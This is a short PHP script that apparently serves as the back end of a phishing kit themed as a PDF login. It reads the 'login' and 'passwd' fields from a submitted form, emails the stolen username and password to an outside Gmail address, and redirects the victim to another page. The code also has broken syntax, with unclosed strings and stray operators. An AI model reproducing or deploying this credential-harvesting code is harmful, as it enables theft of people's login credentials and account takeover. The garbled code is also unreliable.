<?php

$message .= "--------------------+ Login Detail +--------------------;
$message .= "User: ".$_POST['login'].;
$message .= "Pass: ".$_POST['passwd'].;
$message .= "-------------------- [User Information] --------------------";
$POST = 'kwangojohn@gmail.com';
$domain = 'kwangojohn@gmail.com';
$subj = "PDF Login:|";
$from = "From: 'kwangojohn@gmail.com';
mail("kwangojohn@gmail.com",$subj,$message,$from,$domain,$POST);


header("Location: ./po.php");